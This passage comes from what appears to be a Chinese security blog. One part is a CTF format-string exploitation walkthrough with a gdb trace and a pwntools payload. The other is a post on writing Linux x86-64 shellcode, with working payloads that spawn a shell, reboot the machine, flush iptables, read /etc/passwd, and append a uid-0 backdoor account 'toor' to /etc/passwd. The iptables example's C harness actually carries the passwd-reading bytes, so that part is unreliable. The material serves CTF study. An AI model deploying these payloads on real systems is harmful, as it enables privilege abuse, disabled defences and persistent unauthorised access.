&quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi0x00007fffffffdee8│+0x0020: 0x25643233302578360x00007fffffffdef0│+0x0028: 0x2e2e2e2e6e2431310x00007fffffffdef8│+0x0030: 0x00007fffffffded6 → &quot;ABCDEFGH&quot;0x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ x/20g $rsp0x7fffffffdec8: 0x4011f6 0x42410000000000000x7fffffffded8: 0x484746454443 0x31302578363130250x7fffffffdee8: 0x2564323330257836 0x2e2e2e2e6e2431310x7fffffffdef8: 0x7fffffffded6 0x00x7fffffffdf08: 0x0 0x4000400x7fffffffdf18: 0xf0b5ff 0xc20x7fffffffdf28: 0x7fffffffdf57 0x7fffffffdf560x7fffffffdf38: 0x40125d 0x7ffff7fa72e80x7fffffffdf48: 0x401210 0x00x7fffffffdf58: 0x401090 0xffffffffffffe060gef➤ finishRun till exit from #0 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6main () at fmtdemo.c:88 printf(&quot;\\n&quot;);[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x4a $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x0 $rdx : 0x0 $rsp : 0x00007fffffffded0 → 0x0040000000000000$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0xffffded62e2e2e2e$rdi : 0x00007ffff7fa47e0 → 0x0000000000000000$rip : 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$r8 : 0xffffffff $r9 : 0x4a $r10 : 0x00007fffffffd3d0 → 0x0000000000000001$r11 : 0x6e $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffded0│+0x0000: 0x0040000000000000 ← $rsp0x00007fffffffded8│+0x0008: 0x00004847464500000x00007fffffffdee0│+0x0010: 0x31302578363130250x00007fffffffdee8│+0x0018: 0x25643233302578360x00007fffffffdef0│+0x0020: 0x2e2e2e2e6e2431310x00007fffffffdef8│+0x0028: 0x00007fffffffded6 → 0x4847464500000040 (&quot;@&quot;?)0x00007fffffffdf00│+0x0030: 0x00000000000000000x00007fffffffdf08│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x4011e9 &lt;main+115&gt; mov rdi, rax 0x4011ec &lt;main+118&gt; mov eax, 0x0 0x4011f1 &lt;main+123&gt; call 0x401070 &lt;printf@plt&gt; → 0x4011f6 &lt;main+128&gt; mov edi, 0xa 0x4011fb &lt;main+133&gt; call 0x401060 &lt;putchar@plt&gt; 0x401200 &lt;main+138&gt; nop 0x401201 &lt;main+139&gt; leave 0x401202 &lt;main+140&gt; ret 0x401203 nop WORD PTR cs:[rax+rax*1+0x0]──────────────────────────────────────────────────────── source:fmtdemo.c+8 ──── 3 char format[128]; 4 int arg1 = 1, arg2 = 0x88888888, arg3 = -1; 5 char arg4[10] = &quot;ABCDEFGH&quot;; 6 scanf(&quot;%s&quot;, format); 7 printf(format, arg1, arg2, arg3, arg4); → 8 printf(&quot;\\n&quot;); 9 &#125;─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x4011f6 in main (), reason: TEMPORARY BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ x/20g $rsp0x7fffffffded0: 0x40000000000000 0x4847464500000x7fffffffdee0: 0x3130257836313025 0x25643233302578360x7fffffffdef0: 0x2e2e2e2e6e243131 0x7fffffffded60x7fffffffdf00: 0x0 0x00x7fffffffdf10: 0x400040 0xf0b5ff0x7fffffffdf20: 0xc2 0x7fffffffdf570x7fffffffdf30: 0x7fffffffdf56 0x40125d0x7fffffffdf40: 0x7ffff7fa72e8 0x4012100x7fffffffdf50: 0x0 0x4010900x7fffffffdf60: 0xffffffffffffe060 0x188888888gef➤ cContinuing.00000000000000010000000088888888-0000000000000000000000000000001....�����[Inferior 1 (process 25193) exited with code 012]gef➤ 对比 printf() 函数执行前后的输出，printf 首先解析 %11$n 找到获得地址 0x00007fffffffdef8 的值 0x00007fffffffded6，然后跳转到地址 0x00007fffffffded6，将它的值 0x4443424100000000 覆盖为 0x40000000000000，就得到 arg4=0x40000000000000。 2.2.5 任意地址内存覆盖 覆盖任意地址，我们只需要将上节中的地址更改一下就能任意覆盖了。 最后还得强调两点： 首先是需要关闭整个系统的 ASLR 保护，这可以保证栈在 gdb 环境中和直接运行中都保持不变，但这两个栈地址不一定相同。 其次因为在 gdb 调试环境中的栈地址和直接运行程序是不一样的，所以我们需要结合格式化字符串漏洞读取内存，先泄露一个地址出来，然后根据泄露出来的地址计算实际地址。 2.2.6 CTF 中的格式化字符串漏洞 以下内容参考：64位格式化字符串漏洞pwn入门 目标程序： 12345678910111213//fmtdemoI.c#include&lt;stdio.h&gt;void main()&#123; char format[128]; int arg1 =1,arg2=0x88888888,arg3=-1; char arg4[10]=&quot;ABCDEFGH&quot;; scanf(&quot;%s&quot;,format); printf(format,arg1,arg2,arg3,arg4); printf(&quot;arg4的地址：%p\\n&quot;,&amp;arg4); printf(&quot;\\n&quot;);&#125; 做实验首先要注意 1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限） 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 2.编译时关闭CANARY,PIE。 1gcc -fno-stack-protector -no-pie fmtdemoI.c -o fmtdemoI 3.执行fmtdemoI获取arg4的地址 12345sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*8+&quot;.%p&quot;*20)&#x27;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%psakura@Kylin:~/文档/print$ ./fmtdemoIAAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdfb7.0x7fffffffdfb6.0x40126d.0x7ffff7fa72e8arg4的地址：0x7fffffffdf36 如上，AAAAAAAA（即4141414141414141）在格式化字符串的后8个偏移。arg4的地址为0x7fffffffdf36。 经调试，arg4的偏移为10，并且还要注意字符对齐。 12sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*11+&quot;%10$s&quot;+&quot;\\x36\\xdf\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; | ./fmtdemoIAAAAAAAAAAAABCDEFGH6����arg4的地址：0x7fffffffdf36 以下为 python3程序。 123456789101112#fmtdemoI.pyfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)file = ELF(&quot;./fmtdemoI&quot;) io = process(&quot;./fmtdemoI&quot;)addr_arg4 = 0x7fffffffdf36 #arg4的地址payload = (b&#x27;A&#x27;*11)+(b&#x27;%10$s&#x27;)+p64(addr_arg4)print(payload)io.sendline(payload) io.interactive() 执行 fmtdemoI.py，由于此时，获得的 arg4 的地址为 0x7fffffffdf26，所以跟着调整我们的 fmtdemoI.py ，addr_arg4 = 0x7fffffffdf26 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859sakura@Kylin:~/文档/print$ python3 fmt.py [*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26174b&#x27;AAAAAAAAAAA%10$s\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&#x27;[DEBUG] Sent 0x19 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 25 31 30 24 73 │AAAA│AAAA│AAA%│10$s│ 00000010 d6 de ff ff ff 7f 00 00 0a │····│····│·│ 00000019[*] Switching to interactive mode[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26174)[DEBUG] Received 0x31 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 d6 de ff ff ff │AAAA│AAAA│AAA·│····│ 00000010 7f 61 72 67 34 e7 9a 84 e5 9c b0 e5 9d 80 ef bc │·arg│4···│····│····│ 00000020 9a 30 78 37 66 66 66 66 66 66 66 64 66 32 36 0a │·0x7│ffff│fffd│f26·│ 00000030 0a │·│ 00000031AAAAAAAAAAA\\xd6\\xde\\xff\\xff\\xff\\x7farg4的地址：0x7fffffffdf26[*] Got EOF while reading in interactive$ [DEBUG] Sent 0x1 bytes: 10 * 0x1[*] Got EOF while sending in interactiveTraceback (most recent call last): File &quot;/home/sakura/.local/lib/python3.8/site-packages/pwnlib/tubes/process.py&quot;, line 746, in close fd.close()BrokenPipeError: [Errno 32] Broken pipesakura@Kylin:~/文档/print$ python3 fmt.py [*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26190b&#x27;AAAAAAAAAAA%10$s&amp;\\xdf\\xff\\xff\\xff\\x7f\\x00\\x00&#x27;[DEBUG] Sent 0x19 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 25 31 30 24 73 │AAAA│AAAA│AAA%│10$s│ 00000010 26 df ff ff ff 7f 00 00 0a │&amp;···│····│·│ 00000019[*] Switching to interactive mode[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26190)[DEBUG] Received 0x39 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 42 43 44 45 │AAAA│AAAA│AAAA│BCDE│ 00000010 46 47 48 26 df ff ff ff 7f 61 72 67 34 e7 9a 84 │FGH&amp;│····│·arg│4···│ 00000020 e5 9c b0 e5 9d 80 ef bc 9a 30 78 37 66 66 66 66 │····│····│·0x7│ffff│ 00000030 66 66 66 64 66 32 36 0a 0a │fffd│f26·│·│ 00000039AAAAAAAAAAAABCDEFGH&amp;\\xdf\\xff\\xff\\xff\\x7farg4的地址：0x7fffffffdf26[*] Got EOF while reading in interactive$ 可以看到，上面输出AAAAAAAA后紧接着输出了ABCDEFGH，攻击成功！ 总结： 1.arg4地址要放payload的最后，否则64位地址高位是0，小端存储时高位的0会被放在高地址处，读完arg4的地址时字符串就会被00截断。 2.‘A’*11+’%10$s’为16个字节，要注意对齐16字节。 3.‘A’*11+’%10$s’占用一个偏移。 4.若为32位，且地址高位没有0，则payload构造为p32(addr_arg4)+’%8$s’.（偏移不一定为8，看情况） 可以看到这种方法非常强大，可以获得栈中任意的值。 参考： ​ 64位格式化字符串漏洞修改got表利用详解 ​ 格式化字符串漏洞 ​ 64位格式化字符串漏洞pwn入门 ​ python3的pwn用法——when_did_you_born题解——这里我了解到 python3 的 can’t concat str to bytes 问题。 ​ python3-pwntools教程_CTF PWN工具篇1——python3 的 pwntools 使用教程 相关文章： ​ 格式化字符串大杂烩 ​ 非栈上格式化字符串漏洞利用技巧","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://www.rgzzplus.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"Linux_shellcode开发之实战","slug":"Linux-shellcode开发之实战","date":"2022-08-08T14:39:50.000Z","updated":"2022-08-29T14:42:38.611Z","comments":true,"path":"2022/08/08/Linux-shellcode开发之实战/","link":"","permalink":"https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/","excerpt":"","text":"[TOC] 1. 打开 terminal 首先我们来试试最经典的例子 ---- 打开 terminal 那么问题来了用c语言该怎么写？ int execve(const char *filename, char *const argv[], char *const envp[]); filename: 要执行的程序 argv[]：传递给新程序的参数字符串数组 envp[]: 传递给新程序的环境变量字符串数组 1.1 C语言版本 123456789101112#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; char *name[2]; name[0] = &quot;bin/sh&quot;; name[1] = 0x0; execve(name[0], name, NULL); exit(0);&#125; 用gcc编译一下，看看能否运行？ -z execstack 关闭 canary -g 添加信息，便于 gdb 调试 12gcc getTerminal.c -o terminal -z execstack -g./terminal 可以看到程序成功执行，说明我们的思路没有问题。 1.2 写汇编 从上面可以看到，这个 execve(“bin/sh”, [“bin/sh”], NULL) 参数是没有问题的，根据 execve 的系统调用号 0x3b 来布置函数栈帧。 12345678910111213141516global _startsection .text _start: ; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) ; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27; xor rdx, rdx mov qword rbx, &#x27;//bin/sh&#x27; ; 0x68732f6e69622f2f shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 编译运行： 123$ nasm -f elf64 execve_sh64.asm $ ld -m elf_x86_64 execve_sh64.o -o execve_sh64 $ ./execve_sh64 1.3 提取机器码 123456789101112131415161718192021sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64execve_sh64： 文件格式 elf64-x86-64Disassembly of section .text:0000000000401000 &lt;_start&gt;: 401000: 48 31 d2 xor %rdx,%rdx 401003: 48 bb 2f 2f 62 69 6e movabs $0x68732f6e69622f2f,%rbx 40100a: 2f 73 68 40100d: 48 c1 eb 08 shr $0x8,%rbx 401011: 53 push %rbx 401012: 48 89 e7 mov %rsp,%rdi 401015: 50 push %rax 401016: 57 push %rdi 401017: 48 89 e6 mov %rsp,%rsi 40101a: b0 3b mov $0x3b,%al 40101c: 0f 05 syscall &quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; 自动提取机器码： 1for i in $(objdump -d readfile.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo 1.4 测试 将机器码嵌入C语言运行。 1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; const char shellcode[] = &quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot;; //当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度 printf(&quot;Shellcode length: %d bytes\\n&quot;,strlen(shellcode)); (*(void(*)())shellcode)();&#125; 编译运行： 12$ gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g$ ./execve_sh64 成功执行。 2. 重启 reboot 2.1 找到指令位置 首先，查看 reboot 命令所在位置。 12$ whereis rebootreboot: /usr/sbin/reboot /usr/share/man/man8/reboot.8.gz 用此路径（/usr/sbin/reboot）作为参数，进行系统调用。 123456789101112131415161718global _startsection .text _start: ; execve(&quot;/usr/sbin/reboot&quot;, [&quot;/usr/sbin/reboot&quot;], NULL) ; rax = 0x3b, rdx= NULL, rdi = &#x27;/usr/sbin/reboot&#x27;, rsi = &#x27;/usr/sbin/reboot&#x27; xor rdx, rdx push rdx mov rbx, &#x27;n/reboot&#x27; push rbx mov rbx, &#x27;/usr/sbi&#x27; push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 2.2 编译链接运行 123$ nasm -f elf64 execve_reboot.asm$ ld -m elf_x86_64 execve_reboot.o -o execve_reboot$ ./execve_reboot 然后就重启了。 2.3 提取机器码 123456789101112131415161718192021$ objdump -d execve_reboot execve_reboot： 文件格式 elf64-x86-64Disassembly of section .text:0000000000401000 &lt;_start&gt;: 401000: 48 31 d2 xor %rdx,%rdx 401003: 52 push %rdx 401004: 48 bb 6e 2f 72 65 62 movabs $0x746f6f6265722f6e,%rbx 40100b: 6f 6f 74 40100e: 53 push %rbx 40100f: 48 bb 2f 75 73 72 2f movabs $0x6962732f7273752f,%rbx 401016: 73 62 69 401019: 53 push %rbx 40101a: 48 89 e7 mov %rsp,%rdi 40101d: 50 push %rax 40101e: 57 push %rdi 40101f: 48 89 e6 mov %rsp,%rsi 401022: b0 3b mov $0x3b,%al 401024: 0f 05 syscall 1&quot;\\x48\\x31\\xd2\\x52\\x48\\xbb\\x6e\\x2f\\x72\\x65\\x62\\x6f\\x6f\\x74\\x53\\x48\\xbb\\x2f\\x75\\x73\\x72\\x2f\\x73\\x62\\x69\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; 2.4 测试 将机器码嵌入c语言运行。 12345678910#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; const char shellcode[] = &quot;\\x48\\x31\\xd2\\x52\\x48\\xbb\\x6e\\x2f\\x72\\x65\\x62\\x6f\\x6f\\x74\\x53\\x48\\xbb\\x2f\\x75\\x73\\x72\\x2f\\x73\\x62\\x69\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot;; //当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度 printf(&quot;Shellcode length: %d bytes\\n&quot;,strlen(shellcode)); (*(void(*)())shellcode)();&#125; 编译运行： 12$ gcc execve_reboot.c -o execve_reboot -z execstack -z norelro -no-pie -g$ ./execve_reboot 成功重启。 3 关闭防火墙 与防火墙相关的指令，转载于：Linux关闭防火墙命令 123456789101112131415161:查看防火状态systemctl status firewalld2:暂时关闭防火墙systemctl stop firewalld3:永久关闭防火墙systemctl disable firewalldchkconfig iptables off4:重启防火墙systemctl enable firewalld5:永久关闭后重启//暂时还没有试过chkconfig iptables on 我用systemctl 来查看防火墙，发现kylin v10似乎默认没有装防火墙的，那我们就自己装一下。 查看防火墙状态： 我发现，不管是关闭防火墙，还是打开防火墙，都需要 root 权限。而且在Shellcodes database for study cases Exploit Database Shellcodes 这两个网站上，均没有关于防火墙的 shellcode。 不过没有发现这个防火墙的shellcode，但是我发现了 iptable 的shellcode。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#Title: Linux/x86-64 - execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL) - 49 bytes# Author: 10n1z3d &lt;10n1z3d[at]w[dot]cn&gt;# Date: Fri 09 Jul 2010 03:26:12 PM EESTsection .text global _start _start: xor rax, rax push rax push word 0x462d mov rcx, rsp mov rbx, 0x73656c626174ffff shr rbx, 0x10 push rbx mov rbx, 0x70692f6e6962732f push rbx mov rdi, rsp push rax push rcx push rdi mov rsi, rsp ; execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL); mov al, 0x3b syscall /*Usage:sakura@Kylin:~/文档/execveDir$ nasm -f elf64 iptable.asm sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 iptable.o -o iptablesakura@Kylin:~/文档/execveDir$ strace ./iptable sakura@Kylin:~/文档/execveDir$ for i in $(objdump -d iptable.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo */#include &lt;stdio.h&gt;int main()&#123; unsigned char shellcode[] = \\&quot;\\x48\\x31\\xc0\\x48\\x31\\xed\\x50\\x48\\xbd\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x55\\x48\\xbd\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x65\\x74\\x55\\x48\\x89\\xe5\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x61\\x74\\x53\\x48\\x89\\xe3\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x55\\x53\\x48\\x89\\xe6\\x66\\x6a\\x3b\\x66\\x58\\x0f\\x05&quot;; int (*ret)() = (int(*)())shellcode; ret();&#125;/*Usage:sakura@Kylin:~/文档/execveDir$ gcc iptable.c -o iptable -fno-stack-protector -z execstack -wsakura@Kylin:~/文档/execveDir$ sudo ./iptable*/#需要root权限执行，否者缺少权限无法执行。 4. passwd 4.1 读取 passwd 通过系统调用 命令cat 读取： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# Exploit Title: Linux/x64 - execve &quot;cat /etc/passwd&quot; Shellcode (66 bytes)# Date: 2022-08-14# Author: rgzz# Tested on: Kylin v10# Shellcode Length: 66/*;execve(&quot;/bin/cat&quot;, [&quot;/bin/cat&quot;, &quot;/etc/passwd&quot;], NULL)global _startsection .text_start: xor rax, rax ; Zeroes out RAX. xor rbp, rbp ; Zeroes out RBP. push rax ; Pushes RAX&#x27;s NULL-DWORD. mov rbp, 0x6477737361702f63 ; Moves value &quot;dwsspa/c&quot; into RBP. push rbp ; Pushes the vaueof RBP into the Stack. mov rbp, 0x74652f2f2f2f2f2f ; Moves value &quot;te//////&quot; into RBP. push rbp ; Pushes the vaue of RBP into the Stack. mov rbp, rsp ; Copies the value of the Stack into RBP. push rax ; Pushes RAX&#x27;s NULL-DWORD. mov rbx, 0x7461632f6e69622f ; Moves value &quot;tac/nib/&quot; into RBX. push rbx ; Pushes the vaue of RBX into the Stack. mov rbx, rsp ; Copies the value of the Stack into RBX. mov rdi, rsp ; Copies the value of the Stack into RDI. push rax ; Pushes RAX&#x27;s NULL-DWORD. mov rdx, rsp ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0. push rbp ; Pushes the vaue of RBP into the Stack. push rbx ; Pushes the vaue of RBX into the Stack. The full string should be &quot;cat /etc/passwd&quot;. mov rsi, rsp ; Copies this entire string from the Stack into RSI. push word 59 ; Pushes the value 59 (syscall value for execve in the x64 format). pop ax ; Pops this value into AX so there are no NULLs. syscall ; The syscall is executed.*//*Usage:sakura@Kylin:~/文档/execveDir$ nasm -f elf64 cat_passwd.asm sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 cat_passwd.o -o cat_passwdsakura@Kylin:~/文档/execveDir$ strace ./cat_passwd sakura@Kylin:~/文档/execveDir$ for i in $(objdump -d cat_passwd.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo */#include &lt;stdio.h&gt;int main()&#123; unsigned char shellcode[] = \\&quot;\\x48\\x31\\xc0\\x48\\x31\\xed\\x50\\x48\\xbd\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x55\\x48\\xbd\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x65\\x74\\x55\\x48\\x89\\xe5\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x61\\x74\\x53\\x48\\x89\\xe3\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x55\\x53\\x48\\x89\\xe6\\x66\\x6a\\x3b\\x66\\x58\\x0f\\x05&quot;; int (*ret)() = (int(*)())shellcode; ret();&#125;/*Usage:sakura@Kylin:~/文档/execveDir$ gcc cat_passwd.c -o cat_passwd -fno-stack-protector -z execstack -wsakura@Kylin:~/文档/execveDir$ ./cat_passwd*/ 通过系统调用 read 方式读取： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# Exploit Title: Linux/x64 - read passwd# Date: 2022-08-14# Author: rgzz# Tested on: Kylin v10global _startsection .text_start: jmp _push_filename _readfile:; syscall open file, 0x2; open(&#x27;/etc/passwd&#x27;, O_RDWR), O_RDWR=0x2pop rdi ; pop path valuexor rax, raxadd al, 2xor rsi, rsi ; set O_RDWR flagsyscall ; syscall read file, 0x0; read(fd, buf, 0xfff), rdi=rax=fd(fd is open&#x27;s return number)sub sp, 0xffflea rsi, [rsp]mov rdi, raxxor rdx, rdxmov dx, 0xfff; size to readxor rax, raxsyscall ; syscall write to stdout, 0x1; write(fd, buf, 0xfff)xor rdi, rdiinc rdi ; set stdout fd = 1mov rdx, raxxor rax, raxinc raxsyscall ; syscall exitxor rax, raxadd al, 60syscall _push_filename:call _readfilepath: db &quot;/etc/passwd&quot;/*Usage:akura@Kylin:~/文档/execveDir$ nasm -f elf64 rw_passwd.asm sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rw_passwd.o -o rw_passwdsakura@Kylin:~/文档/execveDir$ ./rw_passwdsakura@Kylin:~/文档/execveDir$ for i in $(objdump -d rw_passwd.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo *//*#include &lt;stdio.h&gt;int main()&#123; unsigned char shellcode[] = \\&quot;\\xeb\\x3b\\x5f\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x48\\xff\\xc7\\x48\\x89\\xc2\\x48\\x31\\xc0\\x48\\xff\\xc0\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xc0\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64&quot;; int (*ret)() = (int(*)())shellcode; ret();&#125;/*Usage:sakura@Kylin:~/文档/execveDir$ gcc rw_passwd.c -o rw_passwd -fno-stack-protector -z execstack -wsakura@Kylin:~/文档/execveDir$ ./rw_passwd*/ 4.2 写入 passwd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899; Title: add root user (toor:toor); Date: 2022-08-14; Author: rgzz; Tested on: kylin v10;; Action: Adds a user into /etc/passwd with the following information; username: toor; password: toor; uid: 0; gid: 0; home: /root; shell: /bin/sh;; toor:sXuCKi7k3Xh/s:0:0::/root:/bin/shglobal _startsection .text_start: jmp _push_filename ; #define __NR_open 2; int open(const char *pathname, int flags);; rax -&gt; 2; rdi -&gt; /etc/passwd; rsi -&gt; 0x401;; &gt;&gt;&gt; hex(os.O_WRONLY ^ os.O_APPEND); 0x401_openfile:pop rdi ; rdi -&gt; /etc/passwdxor rax, raxxor rsi, rsi ; rsi to zeromov si, 0x401 ; rsi -&gt; O_WRONLY|O_APPENDadd al, 0x2 ; rax -&gt; 2 (open)syscall ; openxchg rdi, rax ; save returned fdjmp short get_entry_address ; start jmp-call-popwrite_entry:; #define __NR_write 1; ssize_t write(int fd, const void *buf, size_t count);; rax -&gt; 1; rdi -&gt; results of open syscall; rsi -&gt; user&#x27;s entry; rdx -&gt; len of user&#x27;s entrypop rsi ; end jmp-call-pop, rsi -&gt; user&#x27;s entrypush 0x1pop rax ; rax -&gt; 1push 38 ; length + 1 for newlinepop rdx ; rdx -&gt; length of user&#x27;s entrysyscall ; write; #define __NR_exit 60; void _exit(int status);; rax -&gt; 60; rdi -&gt; don&#x27;t carepush 60pop raxsyscall 